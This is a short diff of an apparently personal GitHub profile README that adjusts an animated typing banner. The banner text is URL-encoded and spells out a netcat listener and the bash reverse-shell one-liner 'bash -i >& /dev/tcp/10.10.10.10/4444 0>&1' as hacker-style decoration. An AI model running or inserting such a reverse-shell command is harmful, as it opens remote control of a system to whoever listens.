@@ -1,8 +1,8 @@
 
 <!-- Author: Yora -->
-<div align="center"
-<p align="center">
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=20F700&multiline=true&width=408&lines=nc+-lvnp+4444;listening+on++%5Bany%5D++4444++....;connect+to+%5BYora%5D+profile;bash+-i++%3E%26++%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;Yora%3C__~%24++.%2Freboot" alt="Typing SVG" /></a>
+<div align="left"
+#<p align="center">
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4999&pause=1000&color=20F700&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on++%5Bany%5D++4444++....;connect+to+%5BYora%5D+profile;bash+-i++%3E%26++%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;Yora%3C__~%24++.%2Freboot" alt="Typing SVG" /></a>
 </p>
 </div>
 
